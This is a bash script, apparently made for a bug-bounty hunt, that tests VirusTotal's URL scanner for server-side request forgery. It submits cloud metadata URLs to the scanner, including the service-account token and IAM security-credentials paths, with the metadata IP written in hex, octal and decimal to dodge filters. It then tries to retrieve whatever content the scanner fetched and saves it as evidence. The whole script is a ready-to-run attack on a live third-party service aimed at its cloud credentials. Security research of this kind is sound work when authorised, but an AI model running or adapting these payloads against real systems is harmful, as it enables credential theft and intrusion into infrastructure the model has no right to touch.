#!/usr/bin/env bash
# VirusTotal — Phase 3B: URL object inspection + SSRF content check
# This checks the /api/v3/urls/{id} object (NOT analysis) for HTTP response body/headers VT fetched
# Run: VT_API_KEY=<key> bash scripts/vt-url-inspect.sh 2>&1 | tee ~/vt-url-inspect-output.txt

set -euo pipefail
: "${VT_API_KEY:?Set VT_API_KEY}"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
BASE="https://www.virustotal.com/api/v3"
OUT="$HOME/bug-bounty-hunting-/results/virustotal.com/evidence"
mkdir -p "$OUT"

c() { curl -sk --connect-timeout 15 -A "$UA" -H "x-apikey: ${VT_API_KEY}" "$@"; }

b64url() {
  # base64url-encode a string (VT URL identifier format)
  python3 -c "import base64,sys; print(base64.urlsafe_b64encode(sys.argv[1].encode()).decode().rstrip('='))" "$1"
}

echo "══════════════════════════════════════════════════"
echo "Phase 3B: VT URL Object Inspection"
echo "══════════════════════════════════════════════════"

echo ""
echo "=== Step 1: Inspect the URL objects VT fetched ==="
echo "Each URL submitted to VT creates a /api/v3/urls/{id} object."
echo "This object contains: last_http_response_code, last_http_response_headers,"
echo "last_http_response_content_sha256, last_http_response_content_length,"
echo "last_final_url (after redirects), redirection_chain"
echo ""

# Check webhook.site/your-uuid (what we accidentally submitted)
WEBHOOK_URL="https://webhook.site/your-uuid"
WEBHOOK_B64=$(b64url "$WEBHOOK_URL")
echo "=== URL object: ${WEBHOOK_URL} ==="
c "${BASE}/urls/${WEBHOOK_B64}" | python3 -m json.tool 2>/dev/null | tee "$OUT/url-object-webhook.json" | head -60

echo ""
echo "=== Step 2: Submit REAL SSRF targets and check URL objects ==="
echo ""

SSRF_TARGETS=(
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  "http://metadata.google.internal/computeMetadata/v1/instance/"
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://0xa9fea9fe/latest/meta-data/"
  "http://0251.0376.0251.0376/latest/meta-data/"
  "http://2852039166/latest/meta-data/"
  "http://127.0.0.1/"
  "http://localhost/"
)

for target_url in "${SSRF_TARGETS[@]}"; do
  echo ""
  echo "--- Submitting: ${target_url} ---"

  # Submit for scanning
  SUBMIT=$(c -X POST "${BASE}/urls" --data-urlencode "url=${target_url}")
  ANALYSIS_ID=$(echo "$SUBMIT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")
  SUBMIT_ERR=$(echo "$SUBMIT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',{}).get('code','') + ' ' + d.get('error',{}).get('message','')[:60])" 2>/dev/null || echo "")

  if [ -n "$ANALYSIS_ID" ]; then
    echo "[+] Submitted → analysis_id=${ANALYSIS_ID}"

    # Also get the URL object immediately
    TARGET_B64=$(b64url "$target_url")
    echo "[*] Fetching URL object..."
    URL_OBJ=$(c "${BASE}/urls/${TARGET_B64}")
    echo "$URL_OBJ" | python3 -m json.tool 2>/dev/null | grep -E '"last_http_response_code"|"last_final_url"|"last_http_response_content_sha256"|"redirection_chain"|"title"' | head -10

    # Check if the URL was already in VT (someone submitted it before)
    EXISTING_CODE=$(echo "$URL_OBJ" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('last_http_response_code','NOT_YET_SCANNED'))" 2>/dev/null || echo "error")
    echo "[*] Last HTTP response code: ${EXISTING_CODE}"

    if [ "$EXISTING_CODE" != "NOT_YET_SCANNED" ] && [ "$EXISTING_CODE" != "error" ]; then
      echo "[!] URL was already in VT database — VT has fetched this URL before"
      echo "[*] Fetching full URL object for analysis..."
      echo "$URL_OBJ" | python3 -m json.tool 2>/dev/null > "$OUT/url-object-$(echo "$target_url" | md5sum | cut -c1-8).json"
      cat "$OUT/url-object-$(echo "$target_url" | md5sum | cut -c1-8).json" | head -40
    fi
  else
    echo "[-] Submission error: ${SUBMIT_ERR}"
    echo "    Full response: $(echo "$SUBMIT" | head -c 150)"
  fi
done

echo ""
echo "=== Step 3: Wait 30s then poll all analyses for SSRF content ==="
sleep 30

echo ""
echo "=== Step 4: Check analysis + URL object for fetched content ==="
for target_url in "${SSRF_TARGETS[@]}"; do
  TARGET_B64=$(b64url "$target_url")
  URL_OBJ=$(c "${BASE}/urls/${TARGET_B64}" 2>/dev/null)

  HTTP_CODE=$(echo "$URL_OBJ" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('last_http_response_code','?'))" 2>/dev/null || echo "?")
  FINAL_URL=$(echo "$URL_OBJ" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('last_final_url','?'))" 2>/dev/null || echo "?")
  CONTENT_SHA=$(echo "$URL_OBJ" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('last_http_response_content_sha256',''))" 2>/dev/null || echo "")

  echo ""
  echo "URL: ${target_url:0:70}"
  echo "  last_http_response_code: ${HTTP_CODE}"
  echo "  last_final_url:          ${FINAL_URL:0:80}"
  echo "  content_sha256:          ${CONTENT_SHA}"

  if [ -n "$CONTENT_SHA" ] && [ "$CONTENT_SHA" != "?" ]; then
    echo "  [!] VT FETCHED AND STORED CONTENT from this URL (sha256=${CONTENT_SHA})"
    # Try to get the content via /files/{sha256} — might return the fetched SSRF response
    echo "  [*] Checking if response body is accessible as a file..."
    CONTENT_FILE=$(c "${BASE}/files/${CONTENT_SHA}")
    echo "  $CONTENT_FILE" | python3 -m json.tool 2>/dev/null | head -20
  fi

  if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "301" ] || [ "$HTTP_CODE" = "302" ]; then
    echo "  [!!!] SSRF CONFIRMED: VT got HTTP ${HTTP_CODE} from ${target_url}"
    echo "  This means VT's scanner successfully reached the SSRF target!"

    # Log the full URL object for evidence
    echo "$URL_OBJ" | python3 -m json.tool 2>/dev/null > "$OUT/SSRF-CONFIRMED-$(echo "$target_url" | md5sum | cut -c1-8).json"
    echo "  Evidence saved to: $OUT/SSRF-CONFIRMED-*.json"
  fi
done

echo ""
echo "══════════════════════════════════════════════════"
echo "Step 5: Check if VT stores response headers"
echo "══════════════════════════════════════════════════"
# For URLs VT has fetched, get the full HTTP response headers stored
EXAMPLE_B64=$(b64url "http://169.254.169.254/latest/meta-data/")
FULL_OBJ=$(c "${BASE}/urls/${EXAMPLE_B64}")
echo "$FULL_OBJ" | python3 -m json.tool 2>/dev/null | head -80
echo ""
echo "Done. Check evidence in: $OUT/"
